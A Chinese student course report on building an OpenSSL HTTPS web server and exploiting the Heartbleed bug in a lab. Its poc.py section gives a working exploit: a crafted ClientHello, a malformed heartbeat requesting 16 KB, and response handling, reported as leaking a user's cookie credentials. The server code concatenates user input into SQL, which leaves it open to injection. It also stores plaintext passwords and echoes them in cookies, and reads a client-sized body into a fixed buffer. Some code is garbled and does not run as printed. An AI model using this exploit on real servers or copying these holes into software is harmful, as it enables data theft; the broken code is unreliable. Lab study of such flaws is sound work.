[toc]

# 计算机网络安全大作业技术报告

>   14组-20373914-吴文韬
>
>   任务分配：负责完成openssl web服务器后端任务，以及heartbleed心跳漏洞攻击脚本`poc.py`编写

## web服务器后端编写

>   以下阐述web服务器后端实现的具体思路和在这个过程中遇到的一些技术难点

### SSL握手

>   -   商定双方通信所使用的的 TLS 版本 (例如 TLS1.0, 1.2, 1.3等等)；
>   -   确定双方所要使用的密码组合；
>   -   客户端通过服务器的公钥和数字证书 (上篇文章已有介绍)上的数字签名验证服务端的身份；
>   -   生成会话密钥，该密钥将用于握手结束后的对称加密
>
>   <img src="/Users/wwt13/Documents/Notes/assets/bVbCCMD-7895687.png" alt="SSL : TLS 握手过程" style="zoom:50%;" />

其中WebServer实验的TLS版本需要选取TLSv1.2，因为从在做实验的过程中发现，TLSv1.3开始更改了请求发送的结构，也就是说Wireshark无法直接在数据流中识别得到发送certificate的相关报文，不利于我们对TLS协议进行研究。

使用 TLS 1.2 需要两次往返（ 2-RTT ）才能完成握手，然后才能发送请求。TLS 1.3 的握手不再支持静态的 RSA 密钥交换，这意味着必须使用带有前向安全的 Diffie-Hellman 进行全面握手。使用 TLS 1.3 协议只需要一次往返（ 1-RTT ）就可以完成握手。如下图所示

![TLS1.3握手](/Users/wwt13/Documents/Notes/assets/3021099-20230508224912889-126630221.png)

具体相关代码实现见提交的`HttpProtocol.cpp`程序文件

### 密钥生成

>   通过keygen.sh实现了一键服务端、客户端私钥、证书、CA证书、CA自签生成

```shell
# CA证书及密钥生成----分步生成CA密钥及其自签名证书：
# 生成ca私钥
openssl genrsa -aes256 -passout pass:123456 -out ca_rsa_private.pem 2048
# 生成ca自签名证书
openssl req -new -x509 -days 365 -key ca_rsa_private.pem -passin pass:123456 -out ca.crt -subj "/C=CN/ST=GD/L=SZ/O=COM/OU=NSP/CN=CA/emailAddress=youremail@qq.com"

# 服务器证书及密钥生成----分步生成服务器密钥及待签名证书
# 生成服务器私钥
openssl genrsa -aes256 -passout pass:server -out server_rsa_private.pem 2048
# 生成服务器待签名证书
openssl req -new -key server_rsa_private.pem -passin pass:server -out server.csr -subj "/C=CN/ST=GD/L=SZ/O=COM/OU=NSP/CN=SERVER/emailAddress=youremail@qq.com"
# 使用CA证书及密钥对服务器证书进行签名：
openssl x509 -req -days 365 -in server.csr -CA ca.crt -CAkey ca_rsa_private.pem -passin pass:123456 -CAcreateserial -out server.crt
# 将加密的RSA密钥转成未加密的RSA密钥，避免每次读取都要求输入解密密码
# 密码就是生成私钥文件时设置的passout、读取私钥文件时要输入的passin，比如这里要输入“server”
# openssl rsa -in server_rsa_private.pem -out server_rsa_private.pem.unsecure

# 客户端证书及密钥生成----分步生成客户端密钥及待签名证书：
openssl genrsa -aes256 -passout pass:client -out client_rsa_private.pem 2048
openssl req -new -key client_rsa_private.pem -passin pass:client -out client.csr -subj "/C=CN/ST=GD/L=SZ/O=COM/OU=NSP/CN=CLIENT/emailAddress=youremail@qq.com"
# 使用CA证书及密钥对客户端证书进行签名：
openssl x509 -req -days 365 -in client.csr -CA ca.crt -CAkey ca_rsa_private.pem -passin pass:123456 -CAcreateserial -out client.crt
# 将加密的RSA密钥转成未加密的RSA密钥，避免每次读取都要求输入解密密码
# 密码就是生成私钥文件时设置的passout、读取私钥文件时要输入的passin，比如这里要输入“client”
# openssl rsa -in client_rsa_private.pem -out client_rsa_private.pem.unsecure
```

其中，每次客户端服务端建立连接读取证书时需要输入密码的问题，已通过实现`password_db`函数进行解决

```c++
int password_cb(char *buf, int num, int rwflag, void *userdata)
{
    char *pass = PASSWORD;
    if ((unsigned int)num < strlen(pass) + 1)
    {
        return (0);
    }

    strcpy(buf, pass);
    return (strlen(pass));
}
```

###  makefile编译

>   这算是本次SSL实验的较难点之一，因为环境限制不可能直接在虚拟机上进行代码编写，还是得在自己的mac电脑上先把代码写好在通过git服务器将虚拟机上的代码更新，这就涉及到了编译环境的切换问题，具体实现思路如下
>
>   其中`mac`/`normal`/`heartbleed`，分别为本机编译环境，虚拟机WebServer编译环境，heartbleed实验所需的带缺陷的openssl-1.0.1c编译环境
>
>   当前实现的效果，只需make+所需环境前缀即可实现一键编译环境切换

```makefile
# Generated automatically from Makefile.in by configure.
CC = g++

OPENSSL_INCLUDE_MAC = /opt/homebrew/opt/openssl@1.1/include
OPENSSL_LIB_MAC = /opt/homebrew/opt/openssl@1.1/lib
# OPENSSL_MAC = /opt/homebrew/opt/openssl@1.1/bin/openssl
OPENSSL_INCLUDE_LINUX_NORMAL = /usr/local/openssl-1.1.1f/include
OPENSSL_LIB_LINUX_NORMAL = /usr/local/openssl-1.1.1f/lib
# OPENSSL_LINUX_NORMAL = /usr/local/openssl-1.1.1f/bin/openssl
OPENSSL_INCLUDE_LINUX_HEARTBLEED = /usr/local/openssl-1.0.1c/include
OPENSSL_LIB_LINUX_HEARTBLEED = /usr/local/openssl-1.0.1c/lib
# OPENSSL_LINUX_HEARTBLEED = /usr/local/openssl-1.0.1c/bin/openssl

CFLAGS=-g -I$(OPENSSL_INCLUDE) -Wall
LD=-L$(OPENSSL_LIB) -lssl -lcrypto -ldl -lpthread -lsqlite3

.PHONY: clean Key server client

common.o: common.cpp common.h
	$(CC) $(CFLAGS) -c common.cpp

HttpProtocol.o: HttpProtocol.cpp HttpProtocol.h
	$(CC) $(CFLAGS) -std=c++11 -c HttpProtocol.cpp

server.o: server.cpp
	$(CC) $(CFLAGS) -c server.cpp

server: common.o server.o HttpProtocol.o
	$(CC) $(CFLAGS) common.o server.o HttpProtocol.o -o server $(LD)

client: client.cpp
	$(CC) $(CFLAGS) -std=c++11 client.cpp -o client $(LD)

mac:
	OPENSSL_INCLUDE=$(OPENSSL_INCLUDE_MAC) OPENSSL_LIB=$(OPENSSL_LIB_MAC) $(MAKE) Key server client

normal:
	OPENSSL_INCLUDE=$(OPENSSL_INCLUDE_LINUX_NORMAL) OPENSSL_LIB=$(OPENSSL_LIB_LINUX_NORMAL) $(MAKE) Key server client

heartbleed:
	OPENSSL_INCLUDE=$(OPENSSL_INCLUDE_LINUX_HEARTBLEED) OPENSSL_LIB=$(OPENSSL_LIB_LINUX_HEARTBLEED) $(MAKE) Key server client

Key:
	chmod +x keygen.sh
	./keygen.sh

clean:
	rm -rf client.dSYM
	rm -f *.o server client
	rm -f *.crt *.key *.pem *.csr *.srl
```

### 请求处理

>   其中`HEAD`、`GET`、`DELETE`请求重合度较高，并且`GET`请求在给出的代码模板中已经替我们实现好了，具体讲讲`POST`请求的处理实现流程。

POST请求具体结构如下，其中请求头和请求体使用`\r\n`分隔开，该请求体格式常用于HTML表单提交，用于向web服务器提交登录注册相关数据（为什么实现这种形式的POST请求呢，因为便于在浏览器中进行演示，实现一个登录注册页面即可，而且也便于后续的heartbleed漏洞实验演示窃取登录用户存在cookie中的账号密码）
```http
POST /api/v1/resource HTTP/1.1
Host: example.com
Content-Type: application/x-www-form-urlencoded
Authorization: Bearer your-token-here
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36
Content-Length: 85

email=123132&password=12313132
```

请求头分析具体实现如下，需要注意的一点就是POST请求需要提前获取到具体的`Content-Length`，用于后续对请求体的读取。

```c++
int CHttpProtocol::Analyze(PREQUEST pReq, LPBYTE pBuf)
{
	char szSeps[] = " \n"; // 用于分割的字符串，包括空格和换行符(是有空格就分割，有换行符就分割)
	char *cpToken;		   // 用于存放分割后的字符串
	// ..是请求访问父级目录，这是安全风险，直接返回400 Bad Request，拒绝请求
	if (strstr((const char *)pBuf, "..") != NULL)
	{
		strcpy(pReq->StatuCodeReason, HTTP_STATUS_BADREQUEST);
		return 1;
	}
	cpToken = strtok((char *)pBuf, szSeps); // 将获取到的请求头分割成一个个字符串，存放在cpToken中（这里是分割第一次，也就是说cpToken中的内容是GET）
	......
	else if (!strcmp(cpToken, "POST"))
	{
		pReq->nMethod = METHOD_POST;
	}
	......
	else
	{
		// 未实现的协议内容
		strcpy(pReq->StatuCodeReason, HTTP_STATUS_NOTIMPLEMENTED);
		return 1;
	}
	// 获取文件路径
	cpToken = strtok(NULL, szSeps);
	if (cpToken == NULL)
	{
		strcpy(pReq->StatuCodeReason, HTTP_STATUS_BADREQUEST);
		return 1;
	}
	// 首先设置根目录 /home/WebServer
	strcpy(pReq->szFileName, m_strRootDir);
	if (strlen(cpToken) > 1)
	{
		strcat(pReq->szFileName, cpToken); // 拼接得到完整文件路径
	}
	else
	{
		strcat(pReq->szFileName, "/index.html");
	}
	// 接下来需要获取得到Body长度
	while (1)
	{
		cpToken = strtok(NULL, szSeps);
		if (cpToken == NULL)
		{
			break;
		}
		if (!strcmp(cpToken, "Content-Length:"))
		{
			cpToken = strtok(NULL, szSeps);
			pReq->contentLength = atoi(cpToken);
			break;
		}
	}
	return 0;
}
```

请求体读取具体实现：需要注意的一点是网络包会对@等特殊字符进行编码处理，需要使用`urlDecode()`函数进行相关处理才能得到正确内容

```c++
// 读取请求body
if (pReq->contentLength > 0)
{
    char temp[256];
    // 读取body内容
    nRet = BIO_read(io, temp, pReq->contentLength);
    if (nRet <= 0)
    {
        printf("Reading body error!!\r\n");
        pHttpProtocol->Disconnect(pReq);
        delete pReq;
        SSL_free(ssl);
        return NULL;
    }
    temp[pReq->contentLength] = '\0';
    sprintf(pReq->content, "%s", urlDecode(temp).c_str());
    printf("%s\n", pReq->content);
}
```

请求返回响应具体实现：具体步骤如下👇🏻

1.   将请求体解析为json类型的数据，通过`strtok`依据`&=`对其进行分割，再存储在第三方库`nlohmann::json`实现的json结构体中，作为后续数据库需要进行处理的数据
2.   判断请求类型：`signup|login`
3.   数据库操作，signup则将用户信息写入数据库，login则检阅数据库中是否存在对应用户并校验密码正确性（数据库选取的是简单轻便的sqlite3）
4.   请求返回，构造Response字符串并写入io

```c++
else if (pReq->nMethod == METHOD_POST)
{
    json postData;
    char *body = pReq->content;
    char szSeps[] = "&=";
    char *cpToken = strtok((char *)body, szSeps);
    while (cpToken != NULL)
    {
        string key = cpToken;
        cpToken = strtok(NULL, szSeps);
        string value = cpToken;
        postData[key] = value;
        cpToken = strtok(NULL, szSeps);
    }
    char *status, *message;
    // 获取到了注册数据，需要将其写入数据库中
    if (strstr(pReq->szFileName, "signup") != NULL)
    {
        // Connect to the database
        sqlite3 *db;
        int rc = sqlite3_open("database.db", &db);
        if (rc != SQLITE_OK)
        {
            printf("Cannot open database: %s\n", sqlite3_errmsg(db));
            return false;
        }
        // Create the table if it doesn't exist
        const char *createTableQuery = "CREATE TABLE IF NOT EXISTS postData ("
                                       "name TEXT PRIMARY KEY,"
                                       "email TEXT,"
                                       "password TEXT);";
        rc = sqlite3_exec(db, createTableQuery, 0, 0, 0);
        if (rc != SQLITE_OK)
        {
            printf("Cannot create table: %s\n", sqlite3_errmsg(db));
            sqlite3_close(db);
            return false;
        }
        // Insert the post data into the table
        json::iterator it;
        string key[3];
        string value[3];
        int i;
        for (i = 0, it = postData.begin(); it != postData.end(); ++it, i++)
        {
            key[i] = it.key();
            value[i] = it.value();
        }
        string insertQuery = "INSERT INTO postData ('" + key[0] + "', '" + key[1] + "', '" + key[2] + "') VALUES ('" + value[0] + "', '" + value[1] + "', '" + value[2] + "');";
        rc = sqlite3_exec(db, insertQuery.c_str(), 0, 0, 0);
        switch (rc)
        {
        case SQLITE_OK:
            status = "success";
            message = "User registered successfully";
            break;
        case SQLITE_CONSTRAINT:
            status = "success";
            message = "User already exists";
            break;
        default:
            STATUS = HTTP_STATUS_NOTFOUND;
            status = "error";
            message = "Internal server error";
            break;
        }
        // Close the database connection
        sqlite3_close(db);
    }
    // 获取到了登录数据，需要验证登录
    else if (strstr(pReq->szFileName, "login") != NULL)
    {
        printf("try to login\n");
        // Connect to the database
        sqlite3 *db;
        int rc = sqlite3_open("database.db", &db);
        if (rc != SQLITE_OK)
        {
            printf("Cannot open database: %s\n", sqlite3_errmsg(db));
            return false;
        }
        json::iterator it;
        string key[2];
        string value[2];
        int i;
        for (i = 0, it = postData.begin(); it != postData.end(); ++it, i++)
        {
            key[i] = it.key();
            value[i] = it.value();
        }
        sqlite3_stmt *stmt;
        string selectQuery = "SELECT * FROM postData WHERE email='" + value[0] + "' AND password='" + value[1] + "';";
        // 准备SQL语句
        if (sqlite3_prepare_v2(db, selectQuery.c_str(), -1, &stmt, 0) != SQLITE_OK)
        {
            printf("Cannot prepare statement: %s\n", sqlite3_errmsg(db));
            return false;
        }
        // 绑定参数
        sqlite3_bind_text(stmt, 1, value[0].c_str(), -1, SQLITE_STATIC);
        sqlite3_bind_text(stmt, 2, value[1].c_str(), -1, SQLITE_STATIC);
        // 执行并获取第一条记录
        rc = sqlite3_step(stmt);
        // 查询到至少一条记录
        if (rc == SQLITE_ROW)
        {
            status = "success";
            message = "User logged in successfully";
        }
        // 未返回任何记录
        else if (rc == SQLITE_DONE)
        {
            STATUS = HTTP_STATUS_NOTFOUND;
            status = "error";
            message = "User does not exist";
        }
        else
        {
            status = "error";
            message = "Internal server error";
            printf("Cannot execute statement: %s\n", sqlite3_errmsg(db));
        }
        sqlite3_finalize(stmt);
        // Close the database connection
        sqlite3_close(db);
    }
    printf("PostData: %s\n", postData.dump().c_str());
    // POST请求
    char ContentType[50] = "application/json";
    long length = 0;
    json res;
    res["status"] = status;
    res["message"] = message;
    string json_string = res.dump();
    length = json_string.length();
    sprintf((char *)Header, "HTTP/1.1 %s\r\nDate: %s\r\nServer: %s\r\nContent-Type: %s\r\nContent-Length: %d\r\nAccess-Control-Allow-Origin: *\r\nSet-Cookie: postData=%s\r\n\r\n",
            STATUS,
            curTime,						// Date
            "Villa Server 192.168.176.139", // Server"My Https Server"
            ContentType,					// Content-Type
            length,							// Content-length
            postData.dump().c_str());		// Set-Cookie value

    if (BIO_write(io, Header, strlen(Header)) <= 0)
    {
        return false;
    }
    BIO_flush(io); // Only to ensure all IO operations are completed
    printf("SSLSendHeader successfully!\n");
    // Send the JSON response
    if (BIO_write(io, json_string.c_str(), length) <= 0)
    {
        return false;
    }
    BIO_flush(io);
}
```

## heartbleed心跳漏洞利用

### 漏洞环境搭建

>   Ubuntu18.04,openssl-1.0.1c,前面实验实现的webserver

通过config.sh实现一键实验环境搭建

```sh
sudo apt install sqlite3
sudo apt install libsqlite3-dev # for sqlite3.h(开放给高级语言的接口)
sudo apt install tmux
cd ~
wget http://www.openssl.org/source/openssl-1.0.1c.tar.gz
tar -zxvf openssl-1.0.1c.tar.gz
cd openssl-1.0.1c
./config  --prefix=/usr/local/openssl-1.0.1c --openssldir=/usr/local/openssl-1.0.1c/ssl
make
sudo make install
cd ~
wget https://www.openssl.org/source/openssl-1.1.1f.tar.gz
tar -zxvf openssl-1.1.1f.tar.gz
cd openssl-1.1.1f
./config  --prefix=/usr/local/openssl-1.1.1f --openssldir=/usr/local/openssl-1.1.1f/ssl
make
sudo make install
```

遇到的一个小问题☝🏻，直接初始化的ubunt虚拟机无法连接github，需要配置相关http/https/sock5代理才可进行联网

### heartbleed漏洞分析设计

>   源代码链接地址：https://github.com/openssl/openssl/tree/OpenSSL_1_0_1c

查看ssl/dl_both.c，漏洞的补丁从这行语句开始：

```c++
int            
dtls1_process_heartbeat(SSL *s)
    {          
    unsigned char *p = &s->s3->rrec.data[0], *pl;
    unsigned short hbtype;
    unsigned int payload;
    unsigned int padding = 16; /* Use minimum padding */
```

一上来就拿到了一个指向一条SSLv3记录中数据的指针。结构体SSL3_RECORD的定义如下（结构体SSL3_RECORD不是SSLv3记录的实际存储格式。一条SSLv3记录所遵循的存储格式请参见下文分析）

```c++
typedef struct ssl3_record_st
    {
        int type;               /* type of record */
        unsigned int length;    /* How many bytes available */
        unsigned int off;       /* read/write offset into 'buf' */
        unsigned char *data;    /* pointer to the record data */
        unsigned char *input;   /* where the decode bytes are */
        unsigned char *comp;    /* only used with decompression - malloc()ed */
        unsigned long epoch;    /* epoch number, needed by DTLS1 */
        unsigned char seq_num[8]; /* sequence number, needed by DTLS1 */

    } SSL3_RECORD;
```

 每条SSLv3记录中包含一个类型域（type）、一个长度域（length）和一个指向记录数据的指针（data）。我们回头去看dtls1_process_heartbeat：

```c++
/* Read type and payload length first */
hbtype = *p++;
n2s(p, payload);
pl = p;
```

 SSLv3记录的第一个字节标明了心跳包的类型。宏n2s从指针p指向的数组中取出前两个字节，并把它们存入变量payload中——这实际上是心跳包载荷的长度域（length）。注意程序并没有检查这条SSLv3记录的实际长度。变量pl则指向由访问者提供的心跳包数据。

这个函数的后面进行了以下工作：

```c++
unsigned char *buffer, *bp;
int r;
/* Allocate memory for the response, size is 1 byte
 * message type, plus 2 bytes payload length, plus
 * payload, plus padding
 */
buffer = OPENSSL_malloc(1 + 2 + payload + padding);

bp = buffer;
```

 所以程序将分配一段由访问者指定大小的内存区域，这段内存区域最大为 (65535 + 1 + 2 + 16) 个字节。变量bp是用来访问这段内存区域的指针。

```c++
/* Enter response type, length and copy payload */
*bp++ = TLS1_HB_RESPONSE;
s2n(payload, bp);

memcpy(bp, pl, payload); &emsp;&emsp;宏s2n与宏n2s干的事情正好相反：s2n读入一个16 bit长的值，然后将它存成双字节值，所以s2n会将与请求的心跳包载荷长度相同的长度值存入变量payload。然后程序从pl处开始复制payload个字节到新分配的bp数组中——pl指向了用户提供的心跳包数据。最后，程序将所有数据发回给用户。
```

也就是说，用户构造的恶意payload，如果用户并没有在心跳包中提供足够多的数据，会导致什么问题？比如pl指向的数据实际上只有一个字节，那么memcpy会把这条SSLv3记录之后的数据——无论那些数据是什么——都复制出来

心跳包具体结构如下👇🏻

![img](/Users/wwt13/Documents/Notes/assets/1586019902_64534789.jpg)

由前面分析可知openssl并不会检查Payload length长度域，所以可以直接将其设置为`0x4000`，获取到16384个字节的内存数据，下面是实验设计的畸形心跳漏洞包的相关代码

```python
# 0x18:Heartbleed消息类型; 0x0302:TLS1.1; 0x0003:心跳包长度
# 0x01:Heartbleed request类型; 0x4000:payload长度
hb = h2bin('18 03 02 00 03 01 40 00')
```

poc.py具体实现流程如下👇🏻

1.  首先建立socket连接：

    ```python
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    
    print 'Connecting...'
    
    s.connect((args[0], opts.port))
    ```

2.  根据连接判断协议类型，因为使用OpenSSL协议的不仅仅有https，同时还包括smtp，pop3，imap等协议

    ```python
    if opts.starttls != '':
    	print 'Sending STARTTLS Protocol Command...'
    
    if opts.starttls == 'smtp':
        s.recv(BUFSIZ)
        s.send("EHLO openssl.client.net\n")
        s.recv(BUFSIZ)
        s.send("STARTTLS\n")
        s.recv(BUFSIZ)
    
    if opts.starttls == 'pop3':
        s.recv(BUFSIZ)
        s.send("STLS\n")
        s.recv(BUFSIZ)
    
    if opts.starttls == 'imap':
        s.recv(BUFSIZ)
        s.send("STARTTLS\n")
        s.recv(BUFSIZ)
    
    if opts.starttls == 'ftp':
        s.recv(BUFSIZ)
        s.send("AUTH TLS\n")
        s.recv(BUFSIZ)
    
    if opts.starttls == 'xmpp': # TODO: This needs SASL
        s.send("<stream:stream xmlns:stream='http://etherx.jabber.org/streams' xmlns='jabber:client' to='%s' version='1.0'\n")
        s.recv(BUFSIZ)
    ```

3.  建立握手连接：

    ```python
    s.send(hello)
    ```

4.  握手过程完成后发送构造攻击payload，恶意心跳包：

    ```python
    sys.stdout.flush()
    s.send(hb)
    hit_hb(s, hb)
    ```

5.  获取心跳响应，对响应数据进行判断，是否存在心脏出血漏洞，这里的判断逻辑是：

    1.  通过函数`typ, ver, pay = recvmsg(s)`获取响应包的type：类型；version：版本；payload：填充数据

    2.  判断数据包的type类型字段是否为十六进制**\x18**转换为10进制是否为**24**，因为**type类型为\x18为心跳扩展的数据包**

    3.  确定是否为心跳包之后判断后续payload的长度，如果payload的长度大于3的话即为存在心脏出血漏洞，反之则不存在。

        ```python
        def hit_hb(s, hb):
         	s.send(hb)
            while True:
                typ, ver, pay = recvmsg(s)
            if typ is None:
                print 'No heartbeat response received, server likely not vulnerable'
                return False
        
        	if typ == 24:
                print 'Received heartbeat response:'
                hexdump(pay)
            if len(pay) > 3:
            	print 'WARNING: server returned more data than it should - server is vulnerable!'
            else:
            	print 'Server processed malformed heartbeat, but did not return any extra data.'
            return True
        
             if typ == 21:
                print 'Received alert:'
                hexdump(pay)
                print 'Server returned error, likely not vulnerable'
                return False
        ```

client hello请求构造：关键在于设置心跳拓展，设置 HeartbeatMode 为 peer_allowed_to_send，也就是末尾的`0101`

```python
hello = h2bin('''
16 03 03 00  dc 01 00 00 d8 03 03 53
43 5b 90 9d 9b 72 0b bc  0c bc 2b 92 a8 48 97 cf
bd 39 04 cc 16 0a 85 03  90 9f 77 04 33 d4 de 00
00 66 c0 14 c0 0a c0 22  c0 21 00 39 00 38 00 88
00 87 c0 0f c0 05 00 35  00 84 c0 12 c0 08 c0 1c
c0 1b 00 16 00 13 c0 0d  c0 03 00 0a c0 13 c0 09
c0 1f c0 1e 00 33 00 32  00 9a 00 99 00 45 00 44
c0 0e c0 04 00 2f 00 96  00 41 c0 11 c0 07 c0 0c
c0 02 00 05 00 04 00 15  00 12 00 09 00 14 00 11
00 08 00 06 00 03 00 ff  01 00 00 49 00 0b 00 04
03 00 01 02 00 0a 00 34  00 32 00 0e 00 0d 00 19
00 0b 00 0c 00 18 00 09  00 0a 00 16 00 17 00 08
00 06 00 07 00 14 00 15  00 04 00 05 00 12 00 13
00 01 00 02 00 03 00 0f  00 10 00 11 00 23 00 00
00 0f 00 01 01
''')
```

### 实验结果展示

>   在用户登录webserver后，poc.py立刻就通过heartbeat response获取到了cookie中的所有数据，其中就包括了用户填写的账号密码

![image-20240609105626913](/Users/wwt13/Documents/Notes/assets/image-20240609105626913.png)

